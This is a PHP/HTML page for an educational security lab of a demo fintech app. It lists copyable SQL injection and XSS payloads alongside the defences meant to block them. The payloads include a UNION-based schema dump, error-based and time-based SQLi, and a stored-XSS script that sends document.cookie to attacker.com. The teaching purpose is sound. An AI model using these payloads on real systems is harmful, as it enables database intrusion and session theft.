<?php
require_once __DIR__ . '/../core/Auth.php';
require_once __DIR__ . '/../config/constants.php';
session_start();

$auth = new Auth();
// Le lab est public pour l'éducation, mais certaines fonctions exigent une session
$is_logged = $auth->isLoggedIn();
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interactive Security Lab - Fintech Robuste</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <style>
        :root {
            --lab-primary: #2563eb;
            --lab-secondary: #3b82f6;
            --lab-accent: #f43f5e;
            --lab-dark: #0f172a;
            --lab-bg: #f8fafc;
            --pro-primary: #2563eb;
        }

        .lab-sidebar {
            position: sticky;
            top: 20px;
            height: calc(100vh - 40px);
            overflow-y: auto;
            border-right: 1px solid rgba(0,0,0,0.05);
            padding-right: 20px;
        }

        .payload-card {
            background: white;
            border-radius: 12px;
            border: 1px solid rgba(0,0,0,0.08);
            padding: 20px;
            margin-bottom: 25px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 2px 10px rgba(0,0,0,0.02);
        }

        .payload-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
            border-color: var(--lab-primary);
        }

        .payload-box {
            background: #282c34;
            color: #abb2bf;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Fira Code', 'Courier New', monospace;
            font-size: 0.9rem;
            position: relative;
            margin: 15px 0;
            overflow-x: auto;
        }

        .copy-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background: rgba(255,255,255,0.1);
            border: none;
            color: white;
            padding: 5px 10px;
            border-radius: 4px;
            font-size: 0.75rem;
            cursor: pointer;
            transition: background 0.2s;
        }

        .copy-btn:hover {
            background: rgba(255,255,255,0.2);
        }

        .defense-badge {
            background: rgba(46, 204, 113, 0.1);
            color: #27ae60;
            border: 1px solid rgba(46, 204, 113, 0.2);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            display: inline-block;
            margin-bottom: 15px;
        }

        .vulnerability-badge {
            background: rgba(231, 76, 60, 0.1);
            color: #c0392b;
            border: 1px solid rgba(231, 76, 60, 0.2);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            display: inline-block;
            margin-bottom: 15px;
            margin-right: 10px;
        }

        .nav-link.active {
            background: var(--lab-primary) !important;
            color: white !important;
            border-radius: 8px;
        }

        .hero-section {
            background: white;
            color: var(--lab-dark);
            padding: 100px 0 60px 0;
            margin-bottom: 50px;
            border-bottom: 1px solid rgba(0,0,0,0.05);
            position: relative;
            overflow: hidden;
        }

        .hero-section::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #2563eb, #00dfd8);
        }

        .guide-step {
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }

        .step-num {
            width: 24px;
            height: 24px;
            background: var(--lab-primary);
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 12px;
            font-size: 0.8rem;
            font-weight: bold;
        }

        h2 { scroll-margin-top: 100px; }
    </style>
</head>
<body class="bg-light">

<nav class="navbar navbar-expand-lg navbar-light sticky-top shadow-sm" style="background: rgba(255,255,255,0.9); backdrop-filter: blur(15px); border-bottom: 1px solid rgba(0,0,0,0.05);">
    <div class="container">
        <a class="navbar-brand fw-bold" href="dashboard.php" style="color: #0f172a;">
            <i class="bi bi-shield-lock-fill me-2" style="color: #2563eb;"></i>FINTECH <span style="color: #2563eb;">LAB</span>
        </a>
        <div class="ms-auto d-flex align-items-center gap-3">
            <a href="index.php" class="btn btn-link text-dark text-decoration-none small fw-bold opacity-75">ACCUEIL</a>
            <?php if ($is_logged): ?>
                <a href="dashboard.php" class="btn btn-primary btn-sm px-4 shadow-sm border-0" style="background: #2563eb; border-radius: 12px;">DASHBOARD</a>
            <?php endif; ?>
        </div>
    </div>
</nav>

<div class="hero-section text-center">
    <div class="container">
        <h6 class="text-uppercase tracking-widest fw-800 mb-3" style="color: #2563eb; font-size: 0.8rem;">Centre d'Excellence Sécurité</h6>
        <h1 class="display-4 fw-bold mb-3" style="color: #0f172a; letter-spacing: -0.04em;">Plateforme de Vérification</h1>
        <p class="lead text-muted mx-auto animate-pro-fadein" style="max-width: 700px; font-weight: 500;">Étudiez les protocoles de défense en condition réelle.</p>
        <div class="mt-4">
            <span class="badge bg-light text-primary border px-3 py-2 rounded-pill shadow-sm" style="font-weight: 700; background: #f8fafc !important;">
                <i class="bi bi-cpu-fill me-1"></i> Mode Lab Interactif Activé
            </span>
        </div>
    </div>
</div>

<div class="container mb-5">
    <div class="row">
        <!-- Sidebar Navigation -->
        <div class="col-lg-3 d-none d-lg-block">
            <div class="lab-sidebar">
                <nav id="lab-nav" class="nav flex-column gap-2">
                    <h6 class="text-uppercase small fw-bold text-muted mb-3 px-3">VULNÉRABILITÉS</h6>
                    <a class="nav-link text-dark active" href="#sqli"><i class="bi bi-database-fill me-2"></i>SQL Injection</a>
                    <a class="nav-link text-dark" href="#xss"><i class="bi bi-code-slash me-2"></i>Cross-Site Scripting</a>
                    <a class="nav-link text-dark" href="#idor"><i class="bi bi-person-bounding-box me-2"></i>IDOR & Privilege</a>
                    <a class="nav-link text-dark" href="#auth"><i class="bi bi-key-fill me-2"></i>Broken Auth</a>
                    <a class="nav-link text-dark" href="#logic"><i class="bi bi-lightning-charge-fill me-2"></i>Business Logic</a>
                    
                    <h6 class="text-uppercase small fw-bold text-muted mt-5 mb-3 px-3">GUIDES RAPIDES</h6>
                    <div class="px-3">
                        <div class="guide-step small text-muted">
                            <div class="step-num">1</div> Copiez un payload
                        </div>
                        <div class="guide-step small text-muted">
                            <div class="step-num">2</div> Allez sur la cible
                        </div>
                        <div class="guide-step small text-muted">
                            <div class="step-num">3</div> Observez l'échec
                        </div>
                    </div>
                </nav>
            </div>
        </div>

        <!-- Main Content Area -->
        <div class="col-lg-9">
            
            <!-- SQL INJECTION SECTION -->
            <section id="sqli" class="mb-5 py-3">
                <div class="d-flex align-items-center mb-4">
                    <div class="bg-primary text-white p-3 rounded-3 me-3"><i class="bi bi-database-fill fs-3"></i></div>
                    <div>
                        <h2 class="fw-bold mb-0">SQL Injection (SQLi)</h2>
                        <p class="text-muted small mb-0">Extraction de données non autorisée via la couche DB.</p>
                    </div>
                </div>

                <div class="alert alert-success border-0 shadow-sm d-flex align-items-center mb-4">
                    <i class="bi bi-shield-check-fill fs-3 me-3"></i>
                    <div>
                        <h6 class="fw-bold mb-1">Défense Robuste : Requêtes Préparées (PDO/mysqli)</h6>
                        <p class="small mb-0">Fintech Robuste sépare strictement les données des instructions SQL. Vos payloads seront traités comme simples chaînes de caractères.</p>
                    </div>
                </div>

                <!-- Union Based Payload -->
                <div class="payload-card">
                    <div class="d-flex justify-content-between">
                        <span class="vulnerability-badge">UNION-BASED</span>
                        <span class="defense-badge">PROTECTED</span>
                    </div>
                    <h5 class="fw-bold">Extraction de Schéma (All Tables)</h5>
                    <p class="small text-muted">Tente de fusionner les résultats de la requête de login avec la liste des tables système.</p>
                    <div class="payload-box">
                        <code id="sqli1">admin' UNION SELECT 1,table_name,table_schema,4,5,6 FROM information_schema.tables --</code>
                        <button class="copy-btn" onclick="copy('sqli1')"><i class="bi bi-clipboard"></i> COPIER</button>
                    </div>
                    <p class="x-small text-muted mt-2"><i class="bi bi-info-circle me-1"></i> Cible: Champ "Identifiant" au login.</p>
                </div>

                <!-- Error Based Payload -->
                <div class="payload-card">
                    <div class="d-flex justify-content-between">
                        <span class="vulnerability-badge">ERROR-BASED</span>
                        <span class="defense-badge">SILENT ERRORS</span>
                    </div>
                    <h5 class="fw-bold">Extraction via Message d'Erreur</h5>
                    <p class="small text-muted">Force une erreur SQL qui contient la version de la base de données dans le message retourné.</p>
                    <div class="payload-box">
                        <code id="sqli2">' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,VERSION(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --</code>
                        <button class="copy-btn" onclick="copy('sqli2')"><i class="bi bi-clipboard"></i> COPIER</button>
                    </div>
                </div>

                <!-- Blind SQLi Payload -->
                <div class="payload-card">
                    <div class="d-flex justify-content-between">
                        <span class="vulnerability-badge">TIME-BASED BLIND</span>
                        <span class="defense-badge">ASYNCHRONOUS SECURITY</span>
                    </div>
                    <h5 class="fw-bold">Test de Temporisation (Time Trigger)</h5>
                    <p class="small text-muted">Si le système est vulnérable, la page mettra 5 secondes à répondre.</p>
                    <div class="payload-box">
                        <code id="sqli3">admin' AND SLEEP(5) --</code>
                        <button class="copy-btn" onclick="copy('sqli3')"><i class="bi bi-clipboard"></i> COPIER</button>
                    </div>
                </div>
            </section>

            <!-- XSS SECTION -->
            <section id="xss" class="mb-5 py-3">
                <div class="d-flex align-items-center mb-4">
                    <div class="bg-warning text-dark p-3 rounded-3 me-3"><i class="bi bi-code-slash fs-3"></i></div>
                    <div>
                        <h2 class="fw-bold mb-0">Cross-Site Scripting (XSS)</h2>
                        <p class="text-muted small mb-0">Exécution de scripts malveillants dans le navigateur client.</p>
                    </div>
                </div>

                <!-- Stored XSS -->
                <div class="payload-card">
                    <div class="d-flex justify-content-between">
                        <span class="vulnerability-badge">STORED XSS</span>
                        <span class="defense-badge">HTML ENCODING</span>
                    </div>
                    <h5 class="fw-bold">Vol de Session (Cookie Stealing)</h5>
                    <p class="small text-muted">Tente de récupérer le cookie PHPSESSID et de l'envoyer à un serveur tiers.</p>
                    <div class="payload-box">
                        <code id="xss1">&lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;</code>
                        <button class="copy-btn" onclick="copy('xss1')"><i class="bi bi-clipboard"></i> COPIER</button>
                    </div>
                    <p class="x-small text-muted mt-2"><i class="bi bi-info-circle me-1"></i> Cible: Motif du transfert dans "Transfert".</p>
                </div>

                <!-- SVG Bypass Payload -->
                <div class="payload-card">
                    <div class="d-flex justify-content-between">
                        <span class="vulnerability-badge">SVG XSS</span>
                        <span class="defense-badge">STRICT CONTENT FILTER</span>
                    </div>
                    <h5 class="fw-bold">Vecteur SVG Discret</h5>
                    <p class="small text-muted">Certains filtres XSS oublient de bannir les balises d'image SVG contenant du script.</p>
                    <div class="payload-box">
                        <code id="xss2">&lt;svg onload="alert('XSS SVG')"&gt;</code>
                        <button class="copy-btn" onclick="copy('xss2')"><i class="bi bi-clipboard"></i> COPIER</button>
                    </div>
                </div>

                <!-- DOM Based Payload -->
                <div class="payload-card">
                    <div class="d-flex justify-content-between">
                        <span class="vulnerability-badge">DOM BASED</span>
                        <span class="defense-badge">CLEAN JS LOGIC</span>
                    </div>
                    <h5 class="fw-bold">Injection via Paramètre URL</h5>
                    <p class="small text-muted">Exploite un traitement JavaScript non sécurisé de l'URL.</p>
                    <div class="payload-box">
                        <code id="xss3">javascript:alert(document.domain)</code>
                        <button class="copy-btn" onclick="copy('xss3')"><i class="bi bi-clipboard"></i> COPIER</button>
                    </div>
                </div>
            </section>

            <!-- IDOR & PRIVILEGE SECTION -->
            <section id="idor" class="mb-5 py-3">
                <div class="d-flex align-items-center mb-4">
                    <div class="bg-info text-white p-3 rounded-3 me-3"><i class="bi bi-person-bounding-box fs-3"></i></div>
                    <div>
                        <h2 class="fw-bold mb-0">IDOR & Escalade de Privilège</h2>
                        <p class="text-muted small mb-0">Accès non autorisé à des ressources d'autres utilisateurs.</p>
                    </div>
                </div>

                <div class="payload-card">
                    <h5 class="fw-bold">Manipulation de Paramètre (Vertical)</h5>
                    <p class="small text-muted">Tente de modifier l'ID de l'utilisateur dans les formulaires via l'inspecteur d'éléments (F12).</p>
                    <p class="x-small text-pro-muted border p-2 rounded bg-light">
                        <strong>Test :</strong> Ouvrez la console F12, trouvez <code>&lt;input name="from_user_id" ...&gt;</code> et changez la valeur par <strong>1</strong>.
                    </p>
                    <div class="alert alert-info border-0 py-2 x-small">
                        <i class="bi bi-info-circle-fill me-2"></i><b>Robuste Defense :</b> Le serveur ignore totalement l'ID envoyé par le client et utilise <code>$_SESSION['user_id']</code>.
                    </div>
                </div>
            </section>

             <!-- AUTH SECTION -->
             <section id="auth" class="mb-5 py-3">
                <div class="d-flex align-items-center mb-4">
                    <div class="bg-success text-white p-3 rounded-3 me-3"><i class="bi bi-key-fill fs-3"></i></div>
                    <div>
                        <h2 class="fw-bold mb-0">Broken Authentication</h2>
                        <p class="text-muted small mb-0">Contournement des mécanismes de login.</p>
                    </div>
                </div>

                <div class="payload-card">
                    <h5 class="fw-bold">Attaque par Brute Force (Simulation)</h5>
                    <p class="small text-muted">Fintech Robuste utilise des mots de passe hachés avec <strong>BCRYPT</strong>.</p>
                    <div class="row g-3 mt-2">
                        <div class="col-md-6">
                            <div class="p-3 border rounded bg-light small">
                                <b class="text-danger d-block mb-1">Stockage Ancien (Insecure)</b>
                                <code>7b7a6962...</code> (MD5 hash)
                                <span class="d-block text-muted x-small mt-1">Cassable en quelques secondes via Rainbow Tables.</span>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="p-3 border border-success rounded bg-pro-soft small">
                                <b class="text-success d-block mb-1">Standard Robuste (Secure)</b>
                                <code>$2y$10$QkI8...</code> (Bcrypt)
                                <span class="d-block text-muted x-small mt-1">Protégé contre le hardware-acceleration et le brute force.</span>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

        </div>
    </div>
</div>

<div class="bg-dark text-white py-5">
    <div class="container text-center">
        <p class="small mb-2 opacity-50">&copy; 2026 FINTECH SOLUTIONS - LABORATOIRE DE RECHERCHE</p>
        <div class="d-flex justify-content-center gap-4 small fw-bold tracking-widest text-uppercase">
            <a href="#" class="text-info text-decoration-none">Audit Report</a>
            <a href="#" class="text-info text-decoration-none">Defense Matrix</a>
            <a href="#" class="text-info text-decoration-none">Expert Support</a>
        </div>
    </div>
</div>

<!-- Modal for success copy -->
<div class="position-fixed bottom-0 end-0 p-3" style="z-index: 1080">
    <div id="copyToast" class="toast align-items-center text-white bg-success border-0" role="alert" aria-live="assertive" aria-atomic="true">
        <div class="d-flex">
            <div class="toast-body">
                <i class="bi bi-check-circle-fill me-2"></i> Payload copié avec succès !
            </div>
            <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
<script>
    function copy(id) {
        const text = document.getElementById(id).innerText;
        navigator.clipboard.writeText(text).then(() => {
            const toastElement = document.getElementById('copyToast');
            const toast = new bootstrap.Toast(toastElement);
            toast.show();
        });
    }

    // Scrollspy Nav active state manual implementation
    const sections = document.querySelectorAll('section');
    const navLinks = document.querySelectorAll('.nav-link');

    window.addEventListener('scroll', () => {
        let current = '';
        sections.forEach(section => {
            const sectionTop = section.offsetTop;
            const sectionHeight = section.clientHeight;
            if (pageYOffset >= (sectionTop - 200)) {
                current = section.getAttribute('id');
            }
        });

        navLinks.forEach(link => {
            link.classList.remove('active');
            if (link.getAttribute('href').substring(1) === current) {
                link.classList.add('active');
            }
        });
    });
</script>
</body>
</html>
